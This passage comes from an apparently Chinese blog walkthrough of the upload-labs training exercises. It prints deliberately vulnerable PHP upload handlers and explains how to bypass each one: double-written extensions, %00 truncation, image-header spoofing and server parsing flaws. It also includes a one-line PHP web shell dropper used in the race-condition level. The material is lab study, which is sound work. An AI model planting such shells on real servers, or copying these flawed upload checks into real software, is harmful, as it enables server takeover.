$UPLOAD_ADDR . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723071532566.png" alt="image-20210723071532566"></p>
<blockquote>
<ul>
<li><strong>解析：只是单纯的对第一次发现php进行删除，但是构造一个双写php被删了之后还是可以绕过，例如pphphp=php，检测到php就删了但是又构成了一个php</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723071709332.png" alt="image-20210723071709332"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723071723356.png" alt="image-20210723071723356"></p>
<h1 id="pass-11"><a href="#pass-11" class="headerlink" title="pass-11"></a>pass-11</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">'上传失败！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>对文件名进行了随机，提示%00截断</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723072504799.png" alt="image-20210723072504799"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723072514895.png" alt="image-20210723072514895"></p>
<h1 id="pass-12"><a href="#pass-12" class="headerlink" title="pass-12"></a>pass-12</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723073123544.png" alt="image-20210723073123544"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723073233835.png" alt="image-20210723073233835"></p>
<h1 id="pass-13"><a href="#pass-13" class="headerlink" title="pass-13"></a>pass-13</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);    </span><br><span class="line">    $fileType = <span class="string">''</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">'jpg'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">'gif'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">'unknown'</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = $UPLOAD_ADDR.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>检查图片前两个字节直接合一个图片马解析漏洞，多试几个图片吧，有的图片过大或者过小里面包含着特殊内容的，都可以pass</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723075037447.png" alt="image-20210723075037447"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723075210279.png" alt="image-20210723075210279"></p>
<h1 id="pass-14"><a href="#pass-14" class="headerlink" title="pass-14"></a>pass-14</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext))&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = $UPLOAD_ADDR.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>只是换了个getimagesize的函数来判断图片类型，但是依旧是nginx的解析漏洞</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723075327660.png" alt="image-20210723075327660"></p>
<h1 id="pass-15"><a href="#pass-15" class="headerlink" title="pass-15"></a>pass-15</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"gif"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"jpg"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"png"</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = $UPLOAD_ADDR.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>换了个模块，不影响我们传马，解析</strong></li>
</ul>
</blockquote>
<h1 id="pass-16"><a href="#pass-16" class="headerlink" title="pass-16"></a>pass-16</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    $filename = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $filetype = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>];</span><br><span class="line">    $tmpname = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line"></span><br><span class="line">    $target_path=$UPLOAD_ADDR.basename($filename);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    $fileext= substr(strrchr($filename,<span class="string">"."</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>(($fileext == <span class="string">"jpg"</span>) &amp;&amp; ($filetype==<span class="string">"image/jpeg"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是jpg格式的图片！"</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".jpg"</span>;</span><br><span class="line">                $newimagepath = $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                imagejpeg($im,$newimagepath);</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            $msg = <span class="string">"上传失败！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"png"</span>) &amp;&amp; ($filetype==<span class="string">"image/png"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是png格式的图片！"</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".png"</span>;</span><br><span class="line">                $newimagepath = $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                imagepng($im,$newimagepath);</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            $msg = <span class="string">"上传失败！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"gif"</span>) &amp;&amp; ($filetype==<span class="string">"image/gif"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是gif格式的图片！"</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".gif"</span>;</span><br><span class="line">                $newimagepath = $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                imagegif($im,$newimagepath);</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            $msg = <span class="string">"上传失败！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传后缀为.jpg|.png|.gif的图片文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>对图片进行二次渲染，先上传一个图片，再对比原来的图片，查看渲染的主要位置，然后再不会被渲染的位置加上一句话木马</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723094040459.png" alt="image-20210723094040459"></p>
<h1 id="pass-17和pass-18条件竞争"><a href="#pass-17和pass-18条件竞争" class="headerlink" title="pass-17和pass-18条件竞争"></a>pass-17和pass-18条件竞争</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = $UPLOAD_ADDR . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">'上传失败！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>利用php写的函数来进行强制访问生成</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> file_put_contents(<span class="string">'shell.php'</span>, <span class="string">'&lt;?php eval($_REQUEST[2]);?&gt;'</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="pass-19"><a href="#pass-19" class="headerlink" title="pass-19"></a>pass-19</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">'上传失败！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">'禁止保存为该类型文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><p><strong>绕过方法：控制文件名字、或者控制文件夹的名字。</strong></p>
</li>
<li><ul>
<li><strong>apache解析漏洞，保存为phpinfo.php.xxx</strong></li>
<li><strong>windows文件存储特性，加 .和空格</strong></li>
<li><strong>00截断</strong></li>
<li><strong>/.，move_uploaded_file会忽略掉文件末尾的/.（和windows存储特性不同，这个是函数的特性）。</strong></li>
<li><strong>通过BP 抓包，然后修改数据包 ：upload-20.php%00.jpg  在文件后缀加上jep ， 然后用 %00 进行截断。</strong></li>
<li><strong>上传.php文件，保存为.jpg文件，上传成功；上传.jpg文件，保存为.php文件，上传失败。这样看来校验的应该是保存的文件名，那么又需要看是白名单校验还是黑名单校验，还是上传.php文件，随便输入一个保存的文件名，随便输入一个后缀名，或者是不写后缀名，保存成功。说明是黑名单验证。那黑名单验证就有太多的绕过方式了。</strong></li>
</ul>
</li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723104553232.png" alt="image-20210723104553232"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723104606229.png" alt="image-20210723104606229"></p>
<h1 id="pass-20"><a href="#pass-20" class="headerlink" title="pass-20"></a>pass-20</h1><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723104950466.png" alt="image-20210723104950466"></p>
<blockquote>
<ul>
<li><p><strong>IIS6.0解析漏洞（一）：</strong><br><strong>IIS6.0解析漏洞分两种</strong><br><strong>1、目录解析</strong><br><strong>以*.asp命名的文件夹里的文件都将会被当成ASP文件执行。</strong></p>
<p><strong>2、文件解析</strong><br><strong>*.asp;.jpg 像这种畸形文件名在“；”后面的直接被忽略，也就是说当成 *.asp文件执行。</strong><br><strong>IIS6.0 默认的可执行文件除了asp还包含这三种 *.asa *.cer *.cdx</strong></p>
</li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723105417872.png" alt="image-20210723105417872"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723105451696.png" alt="image-20210723105451696"></p>
<blockquote>
<ul>
<li><strong>可以直接菜刀连asp</strong></li>
</ul>
</blockquote>
<h1 id="pass-21"><a href="#pass-21" class="headerlink" title="pass-21"></a>pass-21</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$allowedExts = <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpeg"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>);</span><br><span class="line">$temp = explode(<span class="string">"."</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line"><span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>];</span><br><span class="line">$extension = end($temp);     <span class="comment">// 获取文件后缀名</span></span><br><span class="line"><span class="keyword">if</span> ((($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/x-png"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</span><br><span class="line">&amp;&amp; ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">204800</span>)   <span class="comment">// 小于 200 kb</span></span><br><span class="line">&amp;&amp; in_array($extension, $allowedExts))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"错误：: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        